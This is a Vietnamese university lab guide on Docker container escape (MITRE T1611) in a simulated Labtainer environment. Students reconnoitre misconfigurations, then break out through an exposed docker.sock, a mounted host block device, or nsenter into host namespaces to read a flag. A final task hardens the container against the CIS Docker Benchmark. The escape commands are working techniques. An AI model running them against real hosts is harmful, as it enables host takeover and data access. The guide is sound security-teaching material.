# HƯỚNG DẪN THỰC HÀNH — Thoát Container Chiếm Quyền Host (Docker Container Escape)

> Học viện Công nghệ Bưu chính Viễn thông — SecLab PTIT
> **Mức độ:** Nâng cao  |  **Phân loại:** Container Security / DevSecOps
> **Ánh xạ khung tham chiếu:** MITRE ATT&CK for Containers — *Escape to Host* (T1611)  |  CIS Docker Benchmark

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `dso-docker-escape` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `docker` CLI, `mount`, `nsenter`, `capsh` / `getcap` (libcap), `cat`, `ls`, `grep`, script trinh sát thủ công (tuỳ chọn: `deepce`) |
| **Kiến thức yêu cầu** | Sử dụng Linux shell cơ bản (di chuyển thư mục, đọc file, đường ống lệnh); hiểu sơ lược Docker là gì (image, container, volume). Các khái niệm chuyên sâu (namespaces, capabilities, cgroups, Docker socket) sẽ được **nhắc lại đầy đủ** trong mục Kiến thức bổ trợ nên **không cần** đã làm bài lab nào trước đó. |

### Mục tiêu học tập
- Hiểu ranh giới cô lập (isolation boundary) giữa container và host được tạo bởi Linux **namespaces**, **capabilities** và **cgroups**, cũng như vì sao ranh giới này KHÔNG phải là ranh giới bảo mật tuyệt đối như máy ảo.
- Nhận diện các dấu hiệu (indicators) cho thấy một container bị cấu hình yếu và có nguy cơ bị "thoát" (escape): cờ `--privileged`, mount `/var/run/docker.sock`, cấp thừa capability như `CAP_SYS_ADMIN`.
- Nắm được ít nhất hai kỹ thuật thoát container thực tế và ánh xạ chúng vào kỹ thuật MITRE ATT&CK T1611 (Escape to Host).
- Áp dụng tư duy DevSecOps: từ vị trí attacker chuyển sang vị trí defender để **hardening** cấu hình container theo CIS Docker Benchmark.

### Kỹ năng đạt được
- Kỹ năng **trinh sát nội bộ container** (in-container reconnaissance) để phát hiện cấu hình sai: đọc `/proc/1/cgroup`, `/proc/self/status`, liệt kê capabilities, kiểm tra device và socket được mount.
- Kỹ năng **khai thác Docker socket** bị lộ để tạo container đặc quyền mount toàn bộ hệ thống tập tin của host.
- Kỹ năng **khai thác capability/privileged** để mount thiết bị khối (block device) của host hoặc dùng `nsenter` đột nhập vào namespace của tiến trình host.
- Kỹ năng **đánh giá & khắc phục rủi ro cấu hình**: viết lại lệnh chạy container an toàn (drop capability, bỏ privileged, user namespace, seccomp/AppArmor).
- Kỹ năng đối chiếu cấu hình thực tế với một khung chuẩn công nghiệp (CIS Docker Benchmark).

---

## 2. Kịch bản

### Tình huống
Sinh viên đóng vai một **pentester** trong một cuộc đánh giá bảo mật (red team engagement). Trong giai đoạn trước, đội đã khai thác một lỗ hổng ứng dụng web và giành được một shell **bên trong một container** tên `app` (IP `172.60.2.10`). Container này chạy một ứng dụng nội bộ nhưng bị đội DevOps cấu hình cẩu thả khi triển khai nhanh.

Mục tiêu của attacker bây giờ không dừng ở việc kiểm soát ứng dụng — mà là **thoát khỏi container để chiếm quyền trên máy host** đang chạy Docker Engine (được mô phỏng bởi container `host-sim`, IP `172.60.2.5`). Trên host có một tập tin nhạy cảm `/root/flag.txt` mà **chỉ có thể đọc được sau khi đã escape thành công** — nó không nằm trong không gian tập tin của container `app`.

Sau khi chứng minh được đường tấn công, sinh viên đổi vai thành **DevSecOps engineer** và phải chỉ ra cấu hình an toàn để bịt lỗ hổng.

### Vai trò của sinh viên
1. Trên container `app` (nơi đã có shell), thực hiện trinh sát để **xác định container đang bị cấu hình yếu** ở điểm nào (privileged? docker.sock? capability thừa?).
2. **Khai thác** một trong các cấu hình sai đó để truy cập hệ thống tập tin / namespace của host.
3. **Đọc flag** đặt trên host — bằng chứng của việc escape thành công.
4. Đóng vai defender: **đề xuất và viết cấu hình `docker run` an toàn** khắc phục lỗ hổng, đối chiếu CIS Docker Benchmark.

### Sơ đồ mạng

```
                       Mạng ảo Labtainer: 172.60.2.0/24
   ┌───────────────────────────┐              ┌───────────────────────────────┐
   │  Container: app            │              │  Container: host-sim          │
   │  IP: 172.60.2.10           │              │  IP: 172.60.2.5               │
   │  (nơi sinh viên có shell)  │              │  Vai: MÔ PHỎNG MÁY HOST        │
   │                            │              │  - Chạy Docker Engine (dind)  │
   │  Cấu hình SAI (1 hoặc      │  escape ──►  │  - /root/flag.txt  (mục tiêu) │
   │  nhiều điểm):              │  T1611       │  - rootfs host = "/" của       │
   │   • --privileged           │              │    host-sim                    │
   │   • mount docker.sock      │◄─ socket ───►│  - Docker daemon socket:       │
   │   • CAP_SYS_ADMIN          │  /var/run/   │    /var/run/docker.sock        │
   │  Công cụ: docker, mount,   │  docker.sock │                                │
   │   nsenter, capsh, getcap   │              │                                │
   └───────────────────────────┘              └───────────────────────────────┘
        │  Sinh viên gõ lệnh tại đây                 ▲
        └───── luồng tấn công: trinh sát → escape → đọc flag trên host ─────────┘
```

> Ghi chú: Trong Labtainer không có "host thật" để escape ra (vì mọi thứ đều là container). Vì vậy vai trò máy host được **mô phỏng** bằng container `host-sim` chạy Docker-in-Docker; container `app` được nối tới daemon/rootfs của `host-sim`. Chi tiết ở mục "Ghi chú triển khai".

---

## 3. Kiến thức bổ trợ

### Kiến thức nền tảng

**Container không phải máy ảo.** Một container chỉ là một (nhóm) tiến trình chạy trực tiếp trên **kernel của host**, được "nhốt" lại bằng ba cơ chế của Linux kernel:
- **Namespaces**: tạo ảo giác về một hệ thống riêng — PID namespace (danh sách tiến trình riêng, tiến trình đầu tiên là PID 1), MOUNT namespace (cây thư mục riêng), NET namespace (card mạng/IP riêng), v.v. Vì cùng chung kernel, nếu tiến trình được đưa trở lại namespace của host thì nó "thấy" toàn bộ host.
- **Capabilities**: Linux chia nhỏ quyền của `root` thành ~40 mảnh quyền (capability). Container mặc định chỉ được cấp một tập con an toàn. `CAP_SYS_ADMIN` là "capability quyền lực nhất" — cho phép `mount`, thao tác nhiều tài nguyên kernel, và thường là bước đệm để escape.
- **cgroups**: giới hạn/kế toán tài nguyên (CPU, RAM). Đường dẫn cgroup của tiến trình (`/proc/1/cgroup`) thường để lộ dấu vết cho biết tiến trình đang chạy trong container Docker (chuỗi `docker`/`kubepods`...).

**Escape to Host (MITRE ATT&CK T1611)** là kỹ thuật kẻ tấn công lợi dụng cấu hình sai hoặc lỗ hổng để phá vỡ ranh giới cô lập, thực thi lệnh trên host. Ba cấu hình sai kinh điển dẫn tới escape:

1. **`--privileged`**: tắt gần như toàn bộ cơ chế cô lập — cấp mọi capability, cho container thấy **mọi thiết bị của host** trong `/dev`. Attacker có thể `mount` thẳng ổ đĩa của host (ví dụ `/dev/sda1`) và đọc/ghi rootfs của host.

2. **Mount Docker socket (`/var/run/docker.sock`)**: Docker socket là "vô lăng" điều khiển Docker daemon (chạy với quyền root trên host). Ai nói chuyện được với socket này thì **ra lệnh cho daemon** tạo container mới. Attacker chỉ cần yêu cầu daemon tạo một container mới có `-v /:/host` (mount toàn bộ rootfs host vào container mới) là đọc/ghi được mọi file của host. Tương đương root trên host.

3. **Capability nguy hiểm (`CAP_SYS_ADMIN`)**: dù không `--privileged`, nếu container được cấp `CAP_SYS_ADMIN` thì attacker có thể `mount` và lạm dụng nhiều cơ chế kernel để thoát ra.

**Kiến thức DevOps liên quan (phần môi trường ~40%):** cách một container được khởi chạy hoàn toàn quyết định bởi các tham số `docker run` (`--privileged`, `--cap-add`, `-v`, `--user`, `--security-opt`). Đây chính là "bề mặt cấu hình" mà DevSecOps phải kiểm soát trong pipeline. **CIS Docker Benchmark** là bộ khuyến nghị cấu hình an toàn cho Docker (ví dụ: 5.4 không dùng privileged, 5.3 hạn chế capabilities, 5.31 không mount docker.sock vào container).

### Thành phần cần quan sát trong bài lab

| Thành phần | Vai trò |
|---|---|
| `/proc/1/cgroup`, `/proc/self/status` | Cho biết đang ở trong container và tập capability hiệu lực (dòng `CapEff`). Dấu hiệu trinh sát đầu tiên. |
| `/var/run/docker.sock` (nếu tồn tại trong `app`) | Socket điều khiển Docker daemon của host; nếu mount vào container = chìa khoá chiếm host. |
| `/dev/sda*` hoặc block device của host (nếu thấy trong container) | Dấu hiệu container `--privileged`; có thể `mount` để truy cập rootfs host. |
| `CapEff` chứa cờ tương ứng `CAP_SYS_ADMIN` | Capability thừa cho phép `mount` và các thao tác kernel đặc quyền. |
| `host-sim` rootfs / `/root/flag.txt` | Vùng chỉ truy cập được **sau khi escape**; chứa flag chấm điểm. |
| Cấu hình `docker run` an toàn (nhiệm vụ hardening) | Sản phẩm phòng thủ: lệnh khởi chạy container đã được vá lỗ hổng. |

### Bảng công cụ & cú pháp

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `cat` / `grep` | `cat /proc/1/cgroup` ; `cat /proc/self/status \| grep -i cap` | Xác nhận đang trong container và đọc các capability đang hiệu lực (`CapEff`, `CapBnd`). |
| `capsh` | `capsh --print` ; `capsh --decode=<hex>` | Liệt kê capability dạng dễ đọc; giải mã giá trị hex `CapEff` sang tên capability. |
| `getcap` | `getcap -r / 2>/dev/null` | Tìm file được gán capability (bổ trợ trinh sát). |
| `ls` | `ls -la /var/run/docker.sock` ; `ls -la /dev/sd*` | Kiểm tra sự tồn tại của Docker socket / block device host bị lộ. |
| `docker` (qua socket) | `docker -H unix:///var/run/docker.sock ps` ; `docker run -v /:/host -it <img> chroot /host sh` | Nói chuyện với daemon host qua socket; tạo container mới mount rootfs host. |
| `mount` | `mount /dev/sda1 /mnt/host` (cần privileged/CAP_SYS_ADMIN) | Gắn ổ đĩa của host vào một điểm trong container để đọc/ghi rootfs host. |
| `nsenter` | `nsenter --target 1 --mount --uts --ipc --net --pid -- sh` | Nhảy vào các namespace của tiến trình host (PID 1) để có shell "trên host" (khi có đủ đặc quyền). |
| `fdisk` / `lsblk` | `fdisk -l` ; `lsblk` | Liệt kê ổ đĩa/phân vùng nhìn thấy được (dấu hiệu privileged). |
| `deepce` (tuỳ chọn, offline) | `./deepce.sh` | Script tự động dò cấu hình sai và gợi ý đường escape (nếu được đóng gói sẵn trong image). |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/ptit2026/pen_lab_2026/raw/refs/heads/main/dso-docker-escape.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer dso-docker-escape
```

(chú ý: sinh viên sử dụng **mã sinh viên** của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm)

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho shell mà attacker đã có **bên trong container `app`**.

---

### Nhiệm vụ 1 — `recon_container`: Trinh sát và nhận diện cấu hình yếu

**Mục tiêu:** Xác nhận mình đang ở trong một container và tìm ra (các) điểm cấu hình sai có thể dẫn tới escape.

**Bước 1:** Xác nhận đang ở trong container Docker bằng cách kiểm tra cgroup của PID 1:
```bash
cat /proc/1/cgroup
```
(chuỗi chứa `docker` hoặc mã hash container là dấu hiệu môi trường container)

**Bước 2:** Đọc tập capability đang hiệu lực của tiến trình hiện tại:
```bash
grep -i cap /proc/self/status
capsh --print
```
Chú ý dòng `CapEff`. Giải mã nếu cần:
```bash
capsh --decode=<gia_tri_hex_CapEff>
```

**Bước 3:** Kiểm tra xem Docker socket của host có bị mount vào container không:
```bash
ls -la /var/run/docker.sock
```

**Bước 4:** Kiểm tra xem có nhìn thấy thiết bị khối (ổ đĩa) của host không — dấu hiệu của `--privileged`:
```bash
ls -la /dev/sd* 2>/dev/null
fdisk -l 2>/dev/null
lsblk 2>/dev/null
```

**Bước 5:** Ghi lại các phát hiện vào một file để tiện đối chiếu:
```bash
{ echo "=== cgroup ==="; cat /proc/1/cgroup;
  echo "=== CapEff ==="; grep CapEff /proc/self/status;
  echo "=== docker.sock ==="; ls -la /var/run/docker.sock 2>/dev/null;
  echo "=== block devices ==="; ls -la /dev/sd* 2>/dev/null; } > /tmp/recon.txt
cat /tmp/recon.txt
```

**Điều kiện hoàn thành nhiệm vụ:** File `/tmp/recon.txt` được tạo và chứa bằng chứng cho ÍT NHẤT một cấu hình sai — tức có tối thiểu một trong các dấu hiệu: (a) `/var/run/docker.sock` tồn tại, (b) nhìn thấy `/dev/sda*`/block device host, hoặc (c) `CapEff` chứa `cap_sys_admin`.

**Câu hỏi 1:** Dựa trên kết quả trinh sát, hãy nêu chính xác (các) điểm cấu hình sai bạn phát hiện được và giải thích vì sao mỗi điểm đó lại phá vỡ ranh giới cô lập giữa container và host.
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `escape_via_socket`: Thoát container qua Docker socket bị lộ

**Mục tiêu:** Lợi dụng `/var/run/docker.sock` được mount vào `app` để ra lệnh cho Docker daemon của host tạo một container mới mount toàn bộ rootfs của host, qua đó truy cập hệ thống tập tin host.

> Nếu trong Nhiệm vụ 1 bạn KHÔNG thấy `docker.sock`, hãy chuyển sang Nhiệm vụ 3 (đường escape qua privileged/CAP_SYS_ADMIN). Chỉ cần escape thành công theo MỘT trong hai đường.

**Bước 1:** Kiểm tra có thể nói chuyện với daemon host qua socket không:
```bash
docker -H unix:///var/run/docker.sock version
docker -H unix:///var/run/docker.sock ps
```

**Bước 2:** Liệt kê image sẵn có trên daemon host để chọn image tạo container mới:
```bash
docker -H unix:///var/run/docker.sock images
```

**Bước 3:** Tạo một container mới **mount toàn bộ rootfs host (`/`)** vào `/host`, rồi `chroot` vào đó để có được ngữ cảnh "root trên host":
```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host <IMAGE> \
  chroot /host sh
```
(thay `<IMAGE>` bằng một image xuất hiện ở Bước 2)

**Bước 4:** Sau khi vào được, xác nhận đang ở trên host bằng cách xem hostname/các dấu hiệu và liệt kê thư mục nhạy cảm:
```bash
hostname
ls -la /root
```

**Điều kiện hoàn thành nhiệm vụ:** Từ bên trong container `app`, tạo thành công một container mới qua socket và có được shell với quyền đọc rootfs của host (chứng minh bằng việc liệt kê được `/root` của host — vùng không nhìn thấy được từ `app` ban đầu).

**Câu hỏi 2:** Vì sao việc mount `/var/run/docker.sock` vào một container gần như tương đương với việc cấp quyền `root` trên host cho bất kỳ ai kiểm soát được container đó? (Gợi ý: nghĩ về quyền mà Docker daemon chạy dưới đó.)
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `escape_via_privileged`: Thoát container qua privileged / CAP_SYS_ADMIN

**Mục tiêu:** Lợi dụng việc container được chạy `--privileged` (hoặc có `CAP_SYS_ADMIN`) để mount trực tiếp ổ đĩa của host và/hoặc đột nhập namespace tiến trình host, từ đó truy cập rootfs host.

**Cách A — Mount block device của host:**

**Bước 1:** Xác định phân vùng chứa rootfs host (thường là `/dev/sda1` hoặc tương tự):
```bash
fdisk -l
lsblk
```

**Bước 2:** Tạo điểm mount và gắn ổ đĩa host vào:
```bash
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
```

**Bước 3:** Truy cập rootfs host qua điểm mount:
```bash
ls -la /mnt/host/root
```

**Cách B — Dùng `nsenter` nhảy vào namespace tiến trình host (khi container chia sẻ PID namespace / có đủ đặc quyền):**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
hostname
ls -la /root
```

**Điều kiện hoàn thành nhiệm vụ:** Truy cập thành công rootfs của host bằng một trong hai cách (mount block device hoặc `nsenter`), chứng minh bằng việc liệt kê được nội dung thư mục `/root` của host.

**Câu hỏi 3:** So sánh mức độ nguy hiểm và điều kiện tiền đề của ba đường escape (docker.sock, `--privileged`, `CAP_SYS_ADMIN` đơn lẻ). Theo bạn, đường nào "ồn ào"/dễ bị phát hiện nhất và vì sao?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `get_flag`: Đọc flag trên host

**Mục tiêu:** Dùng quyền truy cập host vừa giành được để đọc tập tin bí mật `/root/flag.txt` trên host — bằng chứng escape thành công.

**Bước 1:** Từ ngữ cảnh đã truy cập được host (shell sau `chroot`/`nsenter`, hoặc qua điểm mount `/mnt/host`), đọc flag. Chọn đúng đường dẫn theo cách bạn đã escape:
```bash
# Nếu đã chroot/nsenter vào host:
cat /root/flag.txt

# Nếu truy cập qua mount block device:
cat /mnt/host/root/flag.txt

# Nếu tạo container mới mount / vào /host:
cat /host/root/flag.txt
```

**Bước 2:** Lưu flag ra file kết quả trong container `app` để phục vụ chấm điểm:
```bash
cat <đường_dẫn_flag_đúng> > /tmp/flag_result.txt
cat /tmp/flag_result.txt
```

**Điều kiện hoàn thành nhiệm vụ:** File `/tmp/flag_result.txt` chứa chuỗi flag đúng định dạng (ví dụ `PTIT{...}`), được lấy từ `/root/flag.txt` của host — thứ không thể đọc được nếu chưa escape.

**Câu hỏi 4:** Trình bày lại toàn bộ chuỗi tấn công của bạn từ shell ban đầu trong container tới khi đọc được flag trên host. Đâu là "nguyên nhân gốc rễ" (root cause) khiến escape thành công?
Trả lời: _______________________________________

---

### Nhiệm vụ 5 — `harden_container`: Khắc phục và cấu hình container an toàn (DevSecOps)

**Mục tiêu:** Đổi vai thành DevSecOps engineer, đề xuất cấu hình `docker run` an toàn loại bỏ đường escape, và đối chiếu với CIS Docker Benchmark. Đây là nhiệm vụ phòng thủ bắt buộc.

**Bước 1:** Viết lại lệnh khởi chạy container `app` theo nguyên tắc đặc quyền tối thiểu (least privilege). Lưu vào file `/tmp/hardened_run.sh`. Cấu hình an toàn cần đảm bảo:
- KHÔNG dùng `--privileged`.
- KHÔNG mount `/var/run/docker.sock` vào container.
- Loại bỏ toàn bộ capability rồi chỉ thêm lại thứ thực sự cần (`--cap-drop=ALL`, có thể `--cap-add=<chỉ_cái_cần>`).
- Bật user namespace remapping / chạy user không phải root (`--user`), bật no-new-privileges và seccomp/AppArmor.
- Mount tài nguyên ở chế độ chỉ đọc khi có thể.

Mẫu (sinh viên tự hoàn thiện các `<...>`):
```bash
cat > /tmp/hardened_run.sh <<'EOF'
docker run -d --name app \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp-default.json \
  --user <uid_khong_phai_root> \
  --read-only \
  --pids-limit <n> \
  <IMAGE>
# LƯU Ý: KHÔNG có --privileged, KHÔNG có -v /var/run/docker.sock:...
EOF
cat /tmp/hardened_run.sh
```

**Bước 2:** Lập bảng đối chiếu từng cấu hình sai đã khai thác với biện pháp khắc phục và mục CIS Docker Benchmark tương ứng, lưu vào `/tmp/hardening_map.txt`:
```bash
cat > /tmp/hardening_map.txt <<'EOF'
docker.sock mount   -> Bỏ mount socket; nếu cần điều khiển docker, dùng proxy socket có kiểm soát  (CIS 5.31)
--privileged        -> Bỏ privileged; chỉ cấp quyền tối thiểu                                     (CIS 5.4)
CAP_SYS_ADMIN thừa  -> --cap-drop=ALL rồi cap-add đúng nhu cầu                                     (CIS 5.3)
Chạy bằng root      -> --user / userns-remap                                                       (CIS 4.1 / 2.8)
Không có seccomp    -> Bật seccomp/AppArmor + no-new-privileges                                    (CIS 5.1 / 5.21)
EOF
cat /tmp/hardening_map.txt
```

**Bước 3 (kiểm chứng, tuỳ chọn):** Giải thích vì sao với cấu hình mới, mỗi bước escape ở Nhiệm vụ 2/3 sẽ thất bại (ví dụ: không còn socket để gọi daemon; `mount` bị chặn do đã drop `CAP_SYS_ADMIN`; `nsenter` không có quyền).

**Điều kiện hoàn thành nhiệm vụ:** Tồn tại cả hai file `/tmp/hardened_run.sh` (lệnh chạy KHÔNG chứa `--privileged` và KHÔNG mount `docker.sock`, có `--cap-drop=ALL`) và `/tmp/hardening_map.txt` (ánh xạ đủ các cấu hình sai đã khai thác tới biện pháp khắc phục).

**Câu hỏi 5:** Trong pipeline CI/CD, bạn sẽ tự động hoá việc ngăn chặn cấu hình sai này ở khâu nào và bằng công cụ gì (ví dụ kiểm tra tĩnh cấu hình, policy-as-code, quét image)? Giải thích ngắn gọn vì sao "shift-left" lại hiệu quả hơn chỉ phòng thủ ở runtime.
Trả lời: _______________________________________

---

## 5. Ghi chú triển khai (cho người xây lab)

**Container cần dựng (khai báo trong `start.config`, mạng ảo `172.60.2.0/24`):**

| Container | IP | Vai trò | Điểm cần lưu ý |
|---|---|---|---|
| `app` | `172.60.2.10` | Container mục tiêu — nơi sinh viên có shell. Cấu hình YẾU có chủ đích. | Đây là container người dùng thao tác (thiết lập là terminal chính). |
| `host-sim` | `172.60.2.5` | Mô phỏng "máy host" chạy Docker Engine. Chứa `/root/flag.txt`. | Chạy Docker-in-Docker (dind) để có `/var/run/docker.sock` và rootfs "host" thật. |

**Cách mô phỏng "host" và docker.sock trong Labtainer (quan trọng):**
Labtainer không cho phép escape ra VM Labtainer thật. Do đó "host" mà sinh viên chiếm là container `host-sim` chạy image `docker:dind`. Có hai phương án nối `app` tới "host":

- **Phương án A (khuyến nghị — đường docker.sock):** `host-sim` chạy dockerd; chia sẻ Docker socket của `host-sim` sang `app` (qua volume dùng chung giữa hai container, hoặc DOCKER_HOST TCP nội bộ) tại `/var/run/docker.sock`. Flag đặt ở `/root/flag.txt` trong `host-sim`; sinh viên escape bằng `docker -H ... run -v /:/host` để đọc. Đây là mô phỏng sát thực tế nhất và dễ chấm.
- **Phương án B (đường privileged/capability):** Chạy `app` với `--privileged` hoặc `--cap-add=SYS_ADMIN` và cấp cho nó thấy một block device / hoặc chia sẻ PID namespace của `host-sim` (`--pid=container:host-sim`) để `nsenter --target 1` hoạt động. Lưu ý: cấp `--privileged`/`--pid` cho container trong Labtainer phụ thuộc khả năng của lớp Docker bên dưới VM Labtainer — **cần kiểm thử; đây là điểm rủi ro triển khai cần cân nhắc.** Nếu môi trường Labtainer không cho phép nested privileged ổn định, ưu tiên Phương án A và đặt Nhiệm vụ 3 ở dạng "tuỳ chọn/thay thế".

Để bài đầy đủ cả hai đường tấn công, khuyến nghị bật **Phương án A** làm đường chính (Nhiệm vụ 2 + 4 luôn chấm được) và bật thêm cấu hình cho **Phương án B** nếu môi trường hỗ trợ.

**Flag & goals dự kiến (tham số hoá theo mã sinh viên):**
- Flag host: `/root/flag.txt` trên `host-sim`, nội dung `PTIT{...}` sinh ngẫu nhiên theo mã sinh viên.
- `recon_container`: kiểm tra tồn tại `/tmp/recon.txt` trong `app` + chứa ≥1 chuỗi dấu hiệu (`docker.sock` / `sda` / `cap_sys_admin`).
- `escape_via_socket` / `escape_via_privileged`: goal đo qua bash history / artifact chứng minh đã liệt kê được `/root` của host (ví dụ so khớp một file "canary" chỉ tồn tại trên host, như `/root/.hostmarker`).
- `get_flag`: so khớp nội dung `/tmp/flag_result.txt` với chuỗi flag đúng.
- `harden_container`: kiểm tra `/tmp/hardened_run.sh` KHÔNG chứa `--privileged` và KHÔNG chứa `docker.sock`, CÓ chứa `--cap-drop=ALL`; và `/tmp/hardening_map.txt` tồn tại, có ánh xạ.

**Công cụ cần cài trong image `app` (Dockerfile, offline):** `docker` client CLI, `libcap2-bin` (cho `capsh`/`getcap`), `util-linux` (cho `nsenter`, `mount`, `lsblk`, `fdisk`), `grep`. Tuỳ chọn đóng gói sẵn `deepce.sh` vào `/opt` để dùng offline. Đặt sẵn một canary file `/root/.hostmarker` trên `host-sim` để chấm điểm bước escape mà không phụ thuộc flag.

**Lưu ý tài nguyên:** Docker-in-Docker (`host-sim`) tốn RAM/đĩa hơn container thường và cần chạy đặc quyền ở lớp dưới — kiểm thử trên VM Labtainer có đủ RAM (khuyến nghị ≥4GB). Cân nhắc dùng image base nhỏ (alpine) cho container escape để tiết kiệm tài nguyên.

**Ánh xạ khung tham chiếu:** MITRE ATT&CK T1611 (Escape to Host); CIS Docker Benchmark mục 4.1, 5.1, 5.3, 5.4, 5.21, 5.31.
